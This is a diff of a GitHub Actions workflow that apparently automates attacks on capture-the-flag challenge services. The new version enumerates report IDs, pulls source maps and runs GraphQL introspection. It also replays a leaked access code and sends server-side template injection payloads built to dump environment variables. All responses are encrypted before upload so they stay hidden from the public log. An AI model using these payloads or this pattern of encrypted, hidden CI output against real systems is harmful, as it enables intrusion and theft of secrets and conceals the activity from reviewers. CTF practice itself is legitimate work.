@@ -1,4 +1,4 @@
-name: cyberkomi-private-services
+name: cyberkomi-service-offline-probe
 
 on:
   push:
@@ -9,119 +9,65 @@ permissions:
   contents: read
 
 jobs:
-  inspect:
+  probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 12
+    timeout-minutes: 8
     steps:
-      - name: Generate one-time handoff key
+      - name: Probe challenge APIs and encrypt results
         shell: bash
         run: |
-          set -euo pipefail; umask 077; mkdir -p handoff out/services
-          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out handoff/private.pem >/dev/null 2>&1
-          openssl pkey -in handoff/private.pem -pubout -out handoff/public.pem >/dev/null 2>&1
-      - name: Publish public handoff key
-        uses: actions/upload-artifact@v4
-        with:
-          name: cyberkomi-auth3-public-key
-          path: handoff/public.pem
-          retention-days: 1
-      - name: Provision scoped services and collect public task surfaces
-        shell: bash
-        env:
-          RAW_HANDOFF: https://raw.githubusercontent.com/MakSoS1/analytics_test/ctf-cyberkomi-probe-20260808/handoff/token-auth3.enc.b64
-        run: |
-          set -euo pipefail; umask 077
-          for i in $(seq 1 240); do
-            if curl -fsSL --connect-timeout 5 --max-time 10 -H 'Cache-Control: no-cache' "${RAW_HANDOFF}?n=${GITHUB_RUN_ID}-${i}" -o handoff/token.b64 2>/dev/null; then break; fi
-            sleep 2
-          done
-          test -s handoff/token.b64
-          base64 -d handoff/token.b64 > handoff/token.enc
-          openssl pkeyutl -decrypt -inkey handoff/private.pem -in handoff/token.enc -out handoff/token.txt \
-            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          TOKEN=$(cat handoff/token.txt); echo "::add-mask::$TOKEN"; test -n "$TOKEN"
+          set -euo pipefail
+          umask 077
+          mkdir -p out/parma out/gov handoff
+          P='https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru'
+          G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
 
-          for task in parma-line gov-relay sysola-core; do
-            mkdir -p "out/services/$task"
-            base="https://platform.caplag.ru/microserv/task/web/${task}/1"
-            curl -sS --connect-timeout 8 --max-time 30 -H "Authorization: Token $TOKEN" \
-              -D "out/services/$task/state_before.headers" -o "out/services/$task/state_before.json" "$base/state"
-            status=$(python3 - "$task" <<'PY'
-          import json,pathlib,sys
-          d=json.loads(pathlib.Path(f'out/services/{sys.argv[1]}/state_before.json').read_text())
-          print(d.get('status',''))
-          PY
-            )
-            if [ "$status" != active ] && [ "$status" != provisioning ]; then
-              curl -sS -X POST --connect-timeout 8 --max-time 45 -H "Authorization: Token $TOKEN" -H 'Content-Type: application/json' --data '{}' \
-                -D "out/services/$task/up.headers" -o "out/services/$task/up.json" "$base/up"
-            fi
-            for n in $(seq 1 40); do
-              curl -sS --connect-timeout 8 --max-time 30 -H "Authorization: Token $TOKEN" -o "out/services/$task/state_final.json" "$base/state"
-              ready=$(python3 - "$task" <<'PY'
-          import json,pathlib,sys
-          try:d=json.loads(pathlib.Path(f'out/services/{sys.argv[1]}/state_final.json').read_text())
-          except:d={}
-          print('1' if d.get('status')=='active' else '0')
-          PY
-              )
-              [ "$ready" = 1 ] && break
-              sleep 3
-            done
+          # PARMA: documented client routes only, plus GraphQL introspection.
+          curl -sS --connect-timeout 8 --max-time 30 -X POST -D out/parma/login.headers -o out/parma/login.json "$P/api/login" || true
+          for id in $(seq 24000 24030); do
+            curl -sS --connect-timeout 5 --max-time 15 -o "out/parma/report_${id}.json" "$P/api/maintenance/report/$id" || true
           done
+          curl -sS --connect-timeout 8 --max-time 20 -o out/parma/dispatch-map.js.map "$P/static/dispatch-map.js.map" || true
+
+          cat > handoff/gql_route.json <<'JSON'
+          {"query":"query RouteSummary($id:ID!){route(id:$id){id status start finish visibleSequence}}","variables":{"id":"P-23"}}
+          JSON
+          curl -sS --connect-timeout 8 --max-time 30 -H 'Content-Type: application/json' --data-binary @handoff/gql_route.json -o out/parma/gql_route.json "$P/api/graphql" || true
+
+          cat > handoff/gql_schema.json <<'JSON'
+          {"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true) { name args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name } } } } } }"}
+          JSON
+          curl -sS --connect-timeout 8 --max-time 45 -H 'Content-Type: application/json' --data-binary @handoff/gql_schema.json -o out/parma/gql_schema.json "$P/api/graphql" || true
+
+          # GOV: use the previous chapter's client-shipped transition code for observer access.
+          curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
+            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' \
+            -D out/gov/access.headers -o out/gov/access.json "$G/api/access" || true
 
           python3 - <<'PY'
-          import json,pathlib,re,urllib.parse,subprocess,html.parser
-          root=pathlib.Path('out/services')
-          targets=[]
-          for task in ('parma-line','gov-relay','sysola-core'):
-              try:d=json.loads((root/task/'state_final.json').read_text())
-              except Exception:continue
-              creds=d.get('credentials') or {}
-              for e in d.get('endpoints') or []:
-                  urls=[]
-                  if isinstance(e,str):
-                      m=re.findall(r'https?://[^\s,;]+',e); urls+=m
-                      if not m and re.fullmatch(r'[A-Za-z0-9._-]+:\d+',e.strip()): urls.append('http://'+e.strip())
-                  elif isinstance(e,dict):
-                      for k in ('url','uri','endpoint','address'):
-                          v=e.get(k)
-                          if isinstance(v,str) and v.startswith(('http://','https://')): urls.append(v)
-                      host=e.get('host') or e.get('hostname'); port=e.get('port'); proto=e.get('protocol') or e.get('scheme') or 'http'
-                      if host and port: urls.append(f'{proto}://{host}:{port}/')
-                  for u in urls:
-                      targets.append({'task':task,'url':u.rstrip(').]'),'login':creds.get('login'),'password':creds.get('password')})
-          pathlib.Path('out/targets.json').write_text(json.dumps(targets,ensure_ascii=False,indent=2))
-
-          class P(html.parser.HTMLParser):
-              def __init__(self): super().__init__(); self.u=[]
-              def handle_starttag(self,tag,attrs):
-                  d=dict(attrs)
-                  for k in ('src','href'):
-                      if d.get(k): self.u.append(d[k])
-
-          for idx,t in enumerate(targets,1):
-              p=urllib.parse.urlsplit(t['url']); base=f'{p.scheme}://{p.netloc}/'
-              dest=root/f"{idx}_{t['task']}_endpoint"; dest.mkdir(parents=True,exist_ok=True)
-              (dest/'url.txt').write_text(t['url'])
-              auth=[]
-              if t.get('login') and t.get('password'): auth=['-u',f"{t['login']}:{t['password']}"]
-              def fetch(url,name,timeout='20'):
-                  subprocess.run(['curl','-ksS','--connect-timeout','6','--max-time',timeout,'-D',str(dest/(name+'.headers')),'-o',str(dest/(name+'.body')),*auth,url],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-              fetch(base,'root','30')
-              for path in ('robots.txt','openapi.json','swagger.json','health','api'):
-                  fetch(urllib.parse.urljoin(base,path),path.replace('/','_'))
-              try:text=(dest/'root.body').read_text(errors='replace')
-              except Exception:text=''
-              pa=P(); pa.feed(text)
-              seen=[]
-              for raw in pa.u:
-                  u=urllib.parse.urljoin(base,raw); q=urllib.parse.urlsplit(u)
-                  if q.scheme in ('http','https') and q.netloc==p.netloc and u not in seen: seen.append(u)
-              for j,u in enumerate(seen[:20],1): fetch(u,f'asset_{j}','20'); (dest/f'asset_{j}.url').write_text(u)
+          import json, pathlib
+          probes={
+            'arith':'{{7*7}}',
+            'config':'{{config}}',
+            'cycler_env':"{{ cycler.__init__.__globals__.os.environ }}",
+            'joiner_env':"{{ joiner.__init__.__globals__.os.environ }}",
+            'request_env':"{{ request.application.__globals__.__builtins__.__import__('os').environ }}",
+          }
+          for n,t in probes.items(): pathlib.Path(f'handoff/tpl_{n}.json').write_text(json.dumps({'template':t}))
           PY
+          for f in handoff/tpl_*.json; do
+            n=$(basename "$f" .json | sed 's/^tpl_//')
+            curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
+              -H 'Content-Type: application/json' --data-binary @"$f" \
+              -D "out/gov/preview_${n}.headers" -o "out/gov/preview_${n}.json" "$G/api/preview" || true
+          done
 
-          rm -f handoff/token.txt handoff/token.enc handoff/token.b64 handoff/private.pem
+          for path in api/access api/preview ws/broadcast static/gov-relay-client.js.map; do
+            safe=$(echo "$path"|tr '/' '_')
+            curl -sS -X OPTIONS --connect-timeout 5 --max-time 15 -D "out/gov/${safe}.options.headers" -o "out/gov/${safe}.options.body" "$G/$path" || true
+          done
+
+          # Encrypt output; public Actions log contains no challenge secrets/codes from responses.
           cat > handoff/output_public.pem <<'PEM'
           -----BEGIN PUBLIC KEY-----
           MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
@@ -139,14 +85,13 @@ jobs:
           openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
           openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
           cat handoff/key handoff/iv > handoff/keyblob
-          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc \
-            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem
-          echo 'Service discovery complete; only encrypted result uploaded.'
+          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/gov.cookies handoff/*.json
+          echo 'Scoped challenge probes complete; responses are encrypted.'
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-auth3-result-encrypted
+          name: cyberkomi-service-probe-encrypted
           path: |
             handoff/results.enc
             handoff/keyblob.enc
